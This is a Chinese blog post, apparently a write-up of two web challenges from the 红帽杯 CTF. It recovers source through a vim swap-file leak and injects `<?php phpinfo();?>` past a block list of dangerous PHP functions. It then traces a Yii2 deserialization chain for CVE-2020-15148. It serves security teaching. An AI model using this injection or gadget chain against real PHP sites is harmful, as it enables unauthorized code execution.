@@ -1,0 +1,557 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.1.1">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+  <meta name="google-site-verification" content="https://yoyo2yong.xyz">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"www.yoyo2tong.xyz","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="web1扫目录得到  访问robots.txt  访问1ndxx.php，没有结果，尝试访问.1ndxx.php.swp 因为在使用vim时会创建临时缓存文件，关闭vim时缓存文件则会被删除，当vim异常退出后，因为未处理缓存文件，导致可以通过缓存文件恢复原始文件内容 以 index.php 为例：第一次产生的交换文件名为 .index.php.swp 再次意外退出后，将会产生名为 .index.">
+<meta property="og:type" content="article">
+<meta property="og:title" content="红帽杯初赛wp（web）">
+<meta property="og:url" content="http://www.yoyo2tong.xyz/2021/08/04/%E7%BA%A2%E5%B8%BD%E6%9D%AFwp/index.html">
+<meta property="og:site_name" content="zoey">
+<meta property="og:description" content="web1扫目录得到  访问robots.txt  访问1ndxx.php，没有结果，尝试访问.1ndxx.php.swp 因为在使用vim时会创建临时缓存文件，关闭vim时缓存文件则会被删除，当vim异常退出后，因为未处理缓存文件，导致可以通过缓存文件恢复原始文件内容 以 index.php 为例：第一次产生的交换文件名为 .index.php.swp 再次意外退出后，将会产生名为 .index.">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/yoyoOO123/img/main//20210804134221.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/yoyoOO123/img/main//20210804134239.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/yoyoOO123/img/main//20210804134255.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/yoyoOO123/img/main//20210804134308.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/yoyoOO123/img/main//20210804134323.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/yoyoOO123/img/main//20210804134532.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/yoyoOO123/img/main//20210804134500.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/yoyoOO123/img/main//20210804134549.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/yoyoOO123/img/main//20210804134600.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/yoyoOO123/img/main//20210804134613.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/yoyoOO123/img/main//20210804134626.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/yoyoOO123/img/main//20210804134637.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/yoyoOO123/img/main//20210804134717.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/yoyoOO123/img/main//20210804134741.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/yoyoOO123/img/main//20210804134800.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/yoyoOO123/img/main//20210804134813.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/yoyoOO123/img/main//20210804134824.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/yoyoOO123/img/main//20210804134837.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/yoyoOO123/img/main//20210804134857.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/yoyoOO123/img/main//20210804135400.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/yoyoOO123/img/main//20210804132557.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/yoyoOO123/img/main//20210804132524.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/yoyoOO123/img/main//20210804122536.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/yoyoOO123/img/main//20210804131721.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/yoyoOO123/img/main//20210804124029.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/yoyoOO123/img/main//20210804124159.png">
+<meta property="article:published_time" content="2021-08-04T05:49:45.756Z">
+<meta property="article:modified_time" content="2021-08-04T05:54:12.562Z">
+<meta property="article:author" content="zoey">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/yoyoOO123/img/main//20210804134221.png">
+
+<link rel="canonical" href="http://www.yoyo2tong.xyz/2021/08/04/%E7%BA%A2%E5%B8%BD%E6%9D%AFwp/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>红帽杯初赛wp（web） | zoey</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="zoey" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">zoey</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">请多指教！</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-sitemap">
+
+    <a href="/sitemap.xml" rel="section"><i class="fa fa-sitemap fa-fw"></i>站点地图</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://www.yoyo2tong.xyz/2021/08/04/%E7%BA%A2%E5%B8%BD%E6%9D%AFwp/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/1.jpg">
+      <meta itemprop="name" content="zoey">
+      <meta itemprop="description" content="Hello!">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="zoey">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          红帽杯初赛wp（web）
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2021-08-04 13:49:45 / 修改时间：13:54:12" itemprop="dateCreated datePublished" datetime="2021-08-04T13:49:45+08:00">2021-08-04</time>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>8.5k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>8 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h1><p>扫目录得到</p>
+<p><img src="https://raw.githubusercontent.com/yoyoOO123/img/main//20210804134221.png"></p>
+<p>访问robots.txt</p>
+<p><img src="https://raw.githubusercontent.com/yoyoOO123/img/main//20210804134239.png"></p>
+<p>访问1ndxx.php，没有结果，尝试访问.1ndxx.php.swp</p>
+<p>因为在使用vim时会创建临时缓存文件，关闭vim时缓存文件则会被删除，当vim异常退出后，因为未处理缓存文件，导致可以通过缓存文件恢复原始文件内容</p>
+<p>以 index.php 为例：第一次产生的交换文件名为 <strong><code>.index.php.swp</code></strong></p>
+<p>再次意外退出后，将会产生名为 <strong>.index.php.swo</strong> 的交换文件</p>
+<p>第三次产生的交换文件则为 <strong><code>.index.php.swn</code></strong></p>
+<p>访问.index.php.swp得到源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#Really easy...</span></span><br><span class="line">$file=fopen(<span class="string">&quot;flag.php&quot;</span>,<span class="string">&quot;r&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;Unable 2 open!&quot;</span>);</span><br><span class="line">$I_know_you_wanna_but_i_will_not_give_you_hhh = fread($file,filesize(<span class="string">&quot;flag.php&quot;</span>));</span><br><span class="line"></span><br><span class="line">$hack=fopen(<span class="string">&quot;hack.php&quot;</span>,<span class="string">&quot;w&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;Unable 2 open&quot;</span>);</span><br><span class="line">$a=$_GET[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/system|eval|exec|base|compress|chr|ord|str|replace|pack|assert|preg|replace|create|function|call|\~|\^|\`|flag|cat|tac|more|tail|echo|require|include|proc|open|read|shell|file|put|get|contents|dir|link|dl|var|dump/&#x27;</span>,$a))&#123;</span><br><span class="line">  <span class="keyword">die</span>(<span class="string">&quot;you die&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(strlen($a)&gt;<span class="number">33</span>)&#123;</span><br><span class="line">  <span class="keyword">die</span>(<span class="string">&quot;nonono.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">fwrite($hack,$a);</span><br><span class="line">fwrite($hack,$I_know_you_wanna_but_i_will_not_give_you_hhh);</span><br><span class="line"></span><br><span class="line">fclose($file);</span><br><span class="line">fclose($hack);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>首先查看fopen，fread，fwrite等函数的用法：</p>
+<p><img src="https://raw.githubusercontent.com/yoyoOO123/img/main//20210804134255.png"></p>
+<p><img src="https://raw.githubusercontent.com/yoyoOO123/img/main//20210804134308.png"></p>
+<p><img src="https://raw.githubusercontent.com/yoyoOO123/img/main//20210804134323.png"></p>
+<p>fread读取的值需要打印输出才能显示出来</p>
+<p><img src="https://raw.githubusercontent.com/yoyoOO123/img/main//20210804134532.png"></p>
+<p>知道了上面函数的用法，我们可以先分析下面这段代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$file=fopen(<span class="string">&quot;flag.php&quot;</span>,<span class="string">&quot;r&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;Unable 2 open!&quot;</span>);</span><br><span class="line"></span><br><span class="line">$I_know_you_wanna_but_i_will_not_give_you_hhh = fread($file,filesize(<span class="string">&quot;flag.php&quot;</span>));</span><br><span class="line"><span class="comment">//$I_know_you_wanna_but_i_will_not_give_you_hhh 这个函数就是flag.php的内容</span></span><br><span class="line"><span class="keyword">echo</span> $I_know_you_wanna_but_i_will_not_give_you_hhh;</span><br><span class="line"></span><br><span class="line">$hack=fopen(<span class="string">&quot;hack.php&quot;</span>,<span class="string">&quot;w&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;Unable 2 open&quot;</span>);</span><br><span class="line">fwrite($hack,<span class="string">&quot;&lt;?php phpinfo();?&gt;111111111112222222222&quot;</span>);</span><br><span class="line"></span><br><span class="line">fclose($hack);</span><br><span class="line">fclose($file);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> file_get_contents(<span class="string">&quot;hack.php&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/yoyoOO123/img/main//20210804134500.png"></p>
+<p>进一步分析下面这段代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#Really easy...</span></span><br><span class="line">$file=fopen(<span class="string">&quot;flag.php&quot;</span>,<span class="string">&quot;r&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;Unable 2 open!&quot;</span>);</span><br><span class="line">$I_know_you_wanna_but_i_will_not_give_you_hhh = fread($file,filesize(<span class="string">&quot;flag.php&quot;</span>));</span><br><span class="line"></span><br><span class="line">$hack=fopen(<span class="string">&quot;hack.php&quot;</span>,<span class="string">&quot;w&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;Unable 2 open&quot;</span>);</span><br><span class="line"><span class="comment">//$a=$_GET[&#x27;code&#x27;];</span></span><br><span class="line"><span class="comment">//fwrite($hack,$a);//把$a的内容写到hack.php</span></span><br><span class="line"></span><br><span class="line">fwrite($hack, <span class="string">&quot;&lt;?php phpinfo();?&gt;&quot;</span>);</span><br><span class="line">fwrite($hack,$I_know_you_wanna_but_i_will_not_give_you_hhh);<span class="comment">//把flag.php的内容写到flag.php</span></span><br><span class="line">fclose($file);</span><br><span class="line">fclose($hack);</span><br><span class="line"><span class="keyword">echo</span> file_get_contents(<span class="string">&#x27;hack.php&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/yoyoOO123/img/main//20210804134549.png"></p>
+<p>可以看到，新写入hack.php的内容把原来hack.php的内容覆盖了，还有是hack.php前面我们写入的内容，后面才是flag.php的内容。</p>
+<p>一开始的想法就是输入空值，然后打开hack.php就可以看到flag.php的内容，但发现没有flag。</p>
+<p>尝试传入参数<code>?code=&lt;?php phpinfo();?&gt;</code></p>
+<p>然后再打开hack.php输出phpinfo</p>
+<p><img src="https://raw.githubusercontent.com/yoyoOO123/img/main//20210804134600.png"></p>
+<p>在phpinfo中搜索flag</p>
+<p><img src="https://raw.githubusercontent.com/yoyoOO123/img/main//20210804134613.png"></p>
+<p>本来以为这道题的考点还有无参数rce，结果没有。</p>
+<h1 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h1><p>在ctfhub上有环境<code>https://www.ctfhub.com/#/challenge</code></p>
+<p>扫描目录发现<a target="_blank" rel="noopener" href="http://www.zip/">www.zip</a></p>
+<p>在web/index下输入<code>echo Yii::getVersion();</code>，打印出版本号</p>
+<p><img src="https://raw.githubusercontent.com/yoyoOO123/img/main//20210804134626.png"></p>
+<p>可以看到打印出版本号为2.0.32</p>
+<p><img src="https://raw.githubusercontent.com/yoyoOO123/img/main//20210804134637.png"></p>
+<p>搜索这个版本或者更高版本的漏洞</p>
+<p>参考了这一篇文章<code>https://blog.csdn.net/rfrder/article/details/113824239</code></p>
+<p>漏洞出现在yii2.0.38之前的版本中，在2.0.38进行了修复，CVE编号是CVE-2020-15148</p>
+<p><img src="https://raw.githubusercontent.com/yoyoOO123/img/main//20210804134717.png"></p>
+<p>这里有一个序列化函数，再全局搜索__destruct方法</p>
+<p><strong>第一个__destruct</strong></p>
+<p><img src="https://raw.githubusercontent.com/yoyoOO123/img/main//20210804134741.png"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">seed</span>(<span class="params">$seed = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> ($seed === <span class="literal">null</span>) &#123;</span><br><span class="line">            mt_srand();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (PHP_VERSION_ID &lt; <span class="number">70100</span>) &#123;</span><br><span class="line">                mt_srand((<span class="keyword">int</span>) $seed);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                mt_srand((<span class="keyword">int</span>) $seed, MT_RAND_PHP);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//mt_srand() 播种 Mersenne Twister 随机数生成器</span></span><br><span class="line"><span class="comment">//没有什么可以利用的地方，这条利用链到这里就断了</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>第二个__destruct</strong></p>
+<p><img src="https://raw.githubusercontent.com/yoyoOO123/img/main//20210804134800.png"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;stopProcess();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">stopProcess</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">foreach</span> (array_reverse(<span class="keyword">$this</span>-&gt;processes) <span class="keyword">as</span> $process) &#123;</span><br><span class="line">            <span class="comment">/** <span class="doctag">@var</span> $process Process  **/</span></span><br><span class="line">            <span class="keyword">if</span> (!$process-&gt;isRunning()) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output-&gt;debug(<span class="string">&#x27;[RunProcess] Stopping &#x27;</span> . $process-&gt;getCommandLine());</span><br><span class="line">            $process-&gt;stop();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;processes = [];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">addProcessToMonitoring</span>(<span class="params">Process $process, <span class="keyword">array</span> $followingCommands</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;processes[] = [</span><br><span class="line">            <span class="string">&#x27;instance&#x27;</span> =&gt; $process,</span><br><span class="line">            <span class="string">&#x27;following&#x27;</span> =&gt; $followingCommands</span><br><span class="line">        ];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">runProcess</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;processes = [];</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;config <span class="keyword">as</span> $key =&gt; $command) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!$command) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (!is_int($key)) &#123;</span><br><span class="line">                <span class="keyword">continue</span>; <span class="comment">// configuration options</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (method_exists(Process::class, <span class="string">&#x27;fromShellCommandline&#x27;</span>)) &#123;</span><br><span class="line">                <span class="comment">//Symfony 4.2+</span></span><br><span class="line">                $process = Process::fromShellCommandline($command, <span class="keyword">$this</span>-&gt;getRootDir(), <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $process = <span class="keyword">new</span> Process($command, <span class="keyword">$this</span>-&gt;getRootDir(), <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            $process-&gt;start();</span><br><span class="line">            <span class="keyword">$this</span>-&gt;processes[] = $process;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output-&gt;debug(<span class="string">&#x27;[RunProcess] Starting &#x27;</span>.$command);</span><br><span class="line">        &#125;</span><br><span class="line">        sleep(<span class="keyword">$this</span>-&gt;config[<span class="string">&#x27;sleep&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>好像没发现啥危险函数，网上也没有找到利用链，就没有找了。</p>
+<p><strong>第三个destruct</strong></p>
+<p><img src="https://raw.githubusercontent.com/yoyoOO123/img/main//20210804134813.png"></p>
+<p><img src="https://raw.githubusercontent.com/yoyoOO123/img/main//20210804134824.png"></p>
+<p>继续跟进close()，发现没有什么利用的办法，正常可能链就断了，但是大师傅们的思路就是不一样，这里的<code>_dataReader</code>是可控的，那么调用了close的方法，是不是可以想办法触发__call呢？</p>
+<p><code>__call</code> 方法在对象方法不存在的时候被调用</p>
+<p><img src="https://raw.githubusercontent.com/yoyoOO123/img/main//20210804134837.png"></p>
+<p>接下来，全局搜索__call</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params">$method, $attributes</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;format($method, $attributes);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>因为close是无参方法，所以<strong>__call中的<code>$method</code>是close,<code>attributes</code>为空</strong>。继续跟进format方法：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">format</span>(<span class="params">$formatter, $arguments = <span class="keyword">array</span>(<span class="params"></span>)</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> call_user_func_array(<span class="keyword">$this</span>-&gt;getFormatter($formatter), $arguments);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getFormatter</span>(<span class="params">$formatter</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;formatters[$formatter])) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;formatters[$formatter];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;providers <span class="keyword">as</span> $provider) &#123;</span><br><span class="line">        <span class="keyword">if</span> (method_exists($provider, $formatter)) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;formatters[$formatter] = <span class="keyword">array</span>($provider, $formatter);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;formatters[$formatter];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> \<span class="built_in">InvalidArgumentException</span>(sprintf(<span class="string">&#x27;Unknown formatter &quot;%s&quot;&#x27;</span>, $formatter));</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>因为**$this-&gt;formatters**是可控的，因此getFormatter方法的返回值也是我们可控的，因此call_user_func_array($this-&gt;getFormatter($formatter), $arguments);中，回调函数是我们可控的，但是$arguments为空，所以相当于我们现在能干两件事，可以调用yii2中任意的一个无参方法，或者调用原生php的类似phpinfo()这样的无参方法，但是第二种肯定不能RCE，因此还要在yii2中已有的无参方法中进行挖掘：</p>
